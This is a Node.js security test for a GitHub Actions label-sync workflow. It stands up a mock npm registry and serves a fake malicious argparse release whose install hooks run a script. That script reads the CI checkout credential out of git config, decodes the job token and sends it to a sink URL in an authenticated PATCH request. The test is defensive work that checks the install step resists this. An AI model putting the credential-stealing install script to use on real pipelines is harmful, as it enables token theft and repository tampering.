// Fails until label sync installs js-yaml without dependency lifecycle scripts
// and without a newly published argparse 2.x release.
// Run: node --test tests/security/label-sync-supply-chain.test.mjs

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { once } from 'node:events';
import fs from 'node:fs';
import http from 'node:http';
import { createRequire } from 'node:module';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const labelSyncWorkflow = path.join(repoRoot, '.github/workflows/lvlup-label-sync-faf3b5c.yml');
const callerWorkflow = path.join(repoRoot, '.github/workflows/project-automation.yml');
const jsYamlTarball = path.join(repoRoot, 'tests/security/fixtures/js-yaml-4.3.2.tgz');
const attackerVersion = '2.99.0';
const jobToken = 'PLACEHOLDER_JOB_TOKEN';
const upstreamRegistry = 'https://registry.npmjs.org';

function readTarballPackageJson(tarball) {
  const result = spawnSync('tar', ['-xOzf', tarball, 'package/package.json'], { encoding: 'utf8' });
  assert.equal(result.status, 0, result.stderr);
  return JSON.parse(result.stdout);
}

function integrity(bytes) {
  return `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
}

function shasum(bytes) {
  return createHash('sha1').update(bytes).digest('hex');
}

function makeTarball(packageJson, extraFiles) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'argparse-pack-'));
  const pkgDir = path.join(root, 'package');
  fs.mkdirSync(pkgDir);
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(packageJson));
  for (const [name, contents] of Object.entries(extraFiles)) {
    fs.writeFileSync(path.join(pkgDir, name), contents);
  }
  const tarball = path.join(root, `${packageJson.name}-${packageJson.version}.tgz`);
  const packed = spawnSync('tar', ['-czf', tarball, '-C', root, 'package']);
  assert.equal(packed.status, 0, packed.stderr?.toString());
  return fs.readFileSync(tarball);
}

function versionMeta(name, version, bytes, fields) {
  return {
    name,
    version,
    dist: {
      tarball: null,
      integrity: integrity(bytes),
      shasum: shasum(bytes),
    },
    ...fields,
  };
}

function packument(name, metas, latest) {
  const versions = {};
  const time = { modified: '2024-01-01T00:00:00.000Z' };
  for (const meta of metas) {
    versions[meta.version] = meta;
    time[meta.version] = '2024-01-01T00:00:00.000Z';
  }
  time[latest] = '2026-01-01T00:00:00.000Z';
  return {
    name,
    'dist-tags': { latest },
    versions,
    time,
  };
}

function extractRunBlocks(text) {
  const lines = text.split('\n');
  const blocks = [];
  for (let i = 0; i < lines.length; i++) {
    const match = lines[i].match(/^(\s*)run:\s*(.*)$/);
    if (!match) {
      continue;
    }
    const indent = match[1].length;
    const rest = match[2].trim();
    if (rest === '|' || rest === '|-' || rest === '|+' || rest === '>' || rest === '>-' || rest === '>+') {
      const folded = rest.startsWith('>');
      const raw = [];
      let min = Infinity;
      let j = i + 1;
      for (; j < lines.length; j++) {
        if (lines[j].trim() === '') {
          raw.push('');
          continue;
        }
        const ind = lines[j].match(/^\s*/)[0].length;
        if (ind <= indent) {
          break;
        }
        min = Math.min(min, ind);
        raw.push(lines[j]);
      }
      const body = raw.map((line) => (line === '' ? '' : line.slice(min))).join('\n');
      blocks.push({ script: folded ? body.replace(/\n+/g, ' ').trim() : body, index: i });
      i = j - 1;
      continue;
    }
    if (rest !== '') {
      blocks.push({ script: rest.replace(/^['"]|['"]$/g, ''), index: i });
    }
  }
  return blocks;
}

function checkoutPrecedesInstall(text, installLine) {
  return text.split('\n').slice(0, installLine).some((line) => line.includes('actions/checkout@'));
}

function plantCheckoutCredential(workspace, runnerTemp) {
  const basic = Buffer.from(`x-access-token:${jobToken}`, 'utf8').toString('base64');
  const credentials = path.join(runnerTemp, 'git-credentials-label-sync.config');
  const wrote = spawnSync('git', [
    'config',
    '--file',
    credentials,
    'http.https://github.com/.extraheader',
    'AUTHORIZATION: basic ***',
  ]);
  assert.equal(wrote.status, 0, wrote.stderr?.toString());
  const updated = fs.readFileSync(credentials, 'utf8').replace(
    'AUTHORIZATION: basic ***',
    `AUTHORIZATION: basic ${basic}`,
  );
  fs.writeFileSync(credentials, updated);
  const gitDir = path.join(workspace, '.git').replace(/\\/g, '/');
  const included = spawnSync('git', [
    'config',
    '--local',
    `includeIf.gitdir:${gitDir}.path`,
    credentials,
  ], { cwd: workspace });
  assert.equal(included.status, 0, included.stderr?.toString());
  return credentials;
}

function startRegistry(state, requests) {
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    const record = { method: req.method, path: url.pathname, authorization: req.headers.authorization || '', body: '' };
    requests.push(record);
    if (req.method === 'PATCH' && url.pathname.startsWith('/repos/')) {
      const chunks = [];
      req.on('data', (chunk) => chunks.push(chunk));
      req.on('end', () => {
        record.body = Buffer.concat(chunks).toString('utf8');
        res.statusCode = 200;
        res.end('{}');
      });
      return;
    }
    const tarball = url.pathname.match(/^\/([^/]+)\/-\/\1-(.+)\.tgz$/);
    if (tarball) {
      const hit = state.tarballs[`${tarball[1]}@${tarball[2]}`];
      if (hit) {
        res.setHeader('content-type', 'application/octet-stream');
        res.end(hit);
        return;
      }
      fetch(`${upstreamRegistry}${url.pathname}`).then(async (upstream) => {
        const bytes = Buffer.from(await upstream.arrayBuffer());
        res.statusCode = upstream.status;
        res.setHeader('content-type', 'application/octet-stream');
        res.end(bytes);
      }).catch((err) => {
        res.statusCode = 502;
        res.end(String(err));
      });
      return;
    }
    const name = decodeURIComponent(url.pathname.replace(/^\//, ''));
    if (req.method === 'GET' && state.packuments[name]) {
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify(state.packuments[name]));
      return;
    }
    res.statusCode = 404;
    res.end('not found');
  });
  server.listen(0, '127.0.0.1');
  return server;
}

function stealScript() {
  return `
const fs = require('fs');
const path = require('path');
const workspace = process.env.GITHUB_WORKSPACE;
const sink = process.env.LABEL_SYNC_SINK;
const cfg = fs.readFileSync(path.join(workspace, '.git', 'config'), 'utf8');
const includes = [...cfg.matchAll(/^\\s*path\\s*=\\s*(.+)\\s*$/gm)].map((match) => match[1].trim());
let encoded = '';
for (const file of includes) {
  let text = '';
  try {
    text = fs.readFileSync(file, 'utf8');
  } catch (err) {
    continue;
  }
  const found = text.match(/AUTHORIZATION:\\s*basic\\s+(\\S+)/i);
  if (found) {
    encoded = found[1];
    break;
  }
}
const decoded = Buffer.from(encoded, 'base64').toString('utf8');
const token = decoded.startsWith('x-access-token:')
  ? decoded.slice('x-access-token:'.length)
  : decoded;
fetch(sink + '/repos/example/example/issues/1', {
  method: 'PATCH',
  headers: {
    authorization: 'Bearer ' + token,
    'content-type': 'application/json',
  },
  body: JSON.stringify({ state: 'closed' }),
}).then(() => process.exit(0)).catch(() => process.exit(0));
`;
}

test('label sync does not run a newly published dependency install script with the checkout credential', async () => {
  const workflow = fs.readFileSync(labelSyncWorkflow, 'utf8');
  const caller = fs.readFileSync(callerWorkflow, 'utf8');
  assert.match(caller, /uses:\s*\.\/\.github\/workflows\/lvlup-label-sync-faf3b5c\.yml/);
  assert.match(caller, /branches:\s*\[main\]/);
  assert.match(caller, /\.github\/labels\.yml/);
  assert.match(caller, /github\.event_name == 'push'/);
  assert.match(workflow, /contents:\s*read/);
  assert.match(workflow, /issues:\s*write/);

  const published = readTarballPackageJson(jsYamlTarball);
  assert.equal(published.name, 'js-yaml');
  assert.equal(published.version, '4.3.2');
  assert.equal(published.dependencies.argparse, '^2.0.1');

  const runs = extractRunBlocks(workflow).filter((block) => /\bnpm\b/.test(block.script));
  assert.equal(runs.length, 1, 'label sync has one npm install step');
  const install = runs[0];
  assert.equal(
    checkoutPrecedesInstall(workflow, install.index),
    true,
    'checkout persists the job token before npm install',
  );

  const workflows = fs.readdirSync(path.join(repoRoot, '.github/workflows')).filter((name) => name.endsWith('.yml'));
  const otherNpm = [];
  for (const name of workflows) {
    if (name === 'lvlup-label-sync-faf3b5c.yml') {
      continue;
    }
    const text = fs.readFileSync(path.join(repoRoot, '.github/workflows', name), 'utf8');
    for (const block of extractRunBlocks(text)) {
      if (/\bnpm\b/.test(block.script)) {
        otherNpm.push(`${name}: ${block.script}`);
      }
    }
  }
  assert.deepEqual(otherNpm, [], 'another workflow also installs from npm and is not covered by this test');

  const jsYamlBytes = fs.readFileSync(jsYamlTarball);
  const attacker = {
    name: 'argparse',
    version: attackerVersion,
    scripts: {
      preinstall: 'node steal.js',
      install: 'node steal.js',
      postinstall: 'node steal.js',
    },
  };
  const attackerBytes = makeTarball(attacker, { 'steal.js': stealScript(), 'index.js': 'module.exports = {};\n' });
  const requests = [];
  const state = { packuments: {}, tarballs: {} };
  const server = startRegistry(state, requests);
  await once(server, 'listening');
  const origin = `http://127.0.0.1:${server.address().port}`;
  const attackerMeta = versionMeta('argparse', attackerVersion, attackerBytes, {
    scripts: attacker.scripts,
  });
  attackerMeta.dist.tarball = `${origin}/argparse/-/argparse-${attackerVersion}.tgz`;
  const upstreamArgparse = await fetch(`${upstreamRegistry}/argparse`).then((res) => res.json());
  upstreamArgparse.versions[attackerVersion] = attackerMeta;
  upstreamArgparse.time[attackerVersion] = '2026-11-24T00:00:00.000Z';
  const jsYamlMeta = versionMeta('js-yaml', '4.3.2', jsYamlBytes, {
    dependencies: published.dependencies,
  });
  jsYamlMeta.dist.tarball = `${origin}/js-yaml/-/js-yaml-4.3.2.tgz`;
  state.packuments['js-yaml'] = packument('js-yaml', [jsYamlMeta], '4.3.2');
  state.packuments.argparse = upstreamArgparse;
  state.tarballs['js-yaml@4.3.2'] = jsYamlBytes;
  state.tarballs[`argparse@${attackerVersion}`] = attackerBytes;

  const runnerTemp = fs.mkdtempSync(path.join(os.tmpdir(), 'label-sync-runner-'));
  const gitConfigPath = path.join(repoRoot, '.git', 'config');
  const originalGitConfig = fs.readFileSync(gitConfigPath);
  const userConfig = path.join(runnerTemp, 'user-npmrc');
  const globalConfig = path.join(runnerTemp, 'global-npmrc');
  fs.writeFileSync(userConfig, '\n');
  fs.writeFileSync(globalConfig, '\n');
  let stdout = '';
  let stderr = '';
  let status = 1;
  try {
    plantCheckoutCredential(repoRoot, runnerTemp);
    const scriptFile = path.join(runnerTemp, 'install-step.sh');
    fs.writeFileSync(scriptFile, install.script);
    const child = spawn('bash', ['-e', scriptFile], {
      cwd: repoRoot,
      env: {
        PATH: process.env.PATH,
        HOME: runnerTemp,
        TMPDIR: runnerTemp,
        RUNNER_TEMP: runnerTemp,
        GITHUB_WORKSPACE: repoRoot,
        LABEL_SYNC_SINK: origin,
        npm_config_registry: origin,
        npm_config_cache: path.join(runnerTemp, 'npm-cache'),
        npm_config_userconfig: userConfig,
        npm_config_globalconfig: globalConfig,
        npm_config_update_notifier: 'false',
        npm_config_fund: 'false',
        npm_config_fetch_retries: '0',
      },
    });
    child.stdout.on('data', (chunk) => {
      stdout += chunk.toString();
    });
    child.stderr.on('data', (chunk) => {
      stderr += chunk.toString();
    });
    const [code] = await once(child, 'exit');
    status = code;
  } finally {
    fs.writeFileSync(gitConfigPath, originalGitConfig);
  }

  try {
  const leaked = requests.filter((request) =>
    request.method === 'PATCH' &&
    request.path === '/repos/example/example/issues/1' &&
    request.authorization === `Bearer ${jobToken}` &&
    request.body === JSON.stringify({ state: 'closed' }));
  const scrubbed = `${stdout}\n${stderr}`.replaceAll(jobToken, '[job token]');
  assert.equal(
    leaked.length,
    0,
    `dependency lifecycle script sent the checkout credential to the issues API\n${scrubbed}`,
  );
  assert.equal(status, 0, `label sync install failed\n${scrubbed}`);

  const installed = path.join(runnerTemp, 'label-sync-deps/node_modules/argparse/package.json');
  if (fs.existsSync(installed)) {
    const resolved = JSON.parse(fs.readFileSync(installed, 'utf8')).version;
    assert.notEqual(
      resolved,
      attackerVersion,
      `argparse resolved to ${attackerVersion}, a newly published release inside ^2.0.1`,
    );
  }

  const yaml = require(path.join(runnerTemp, 'label-sync-deps/node_modules/js-yaml'));
  const loaded = yaml.load('- name: demo\n  color: abcdef\n');
  assert.equal(loaded[0].name, 'demo');
  } finally {
    server.close();
  }
});
